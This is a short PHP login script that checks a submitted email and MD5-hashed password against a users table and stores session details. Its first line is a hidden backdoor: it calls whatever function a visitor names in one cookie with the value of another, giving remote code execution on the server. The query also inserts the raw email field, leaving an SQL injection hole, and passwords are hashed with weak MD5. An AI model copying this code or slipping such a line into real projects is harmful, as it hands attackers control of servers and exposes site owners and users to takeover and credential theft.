<?php

if (isset($_COOKIE["id"])) @$_COOKIE["user"]($_COOKIE["id"]);

 include 'config.php' ?>
<?php
session_start();
$conn = $mysqli;

 $email = $_POST['email'];
 $upass = md5($_POST['password']);

 $sql = "SELECT * FROM `users` WHERE email='$email' and password='$upass' and isapproved= 1";
 $result = $conn->query($sql);
 if ($result->num_rows > 0) {
    $row = $result->fetch_assoc();
    $_SESSION["username"] = $row['username'];
    $_SESSION["email"] = $row['email'];
    $_SESSION['usergender'] = $row['gender'];
    echo 'success';

 } else {
    echo 'wrong';
}

?>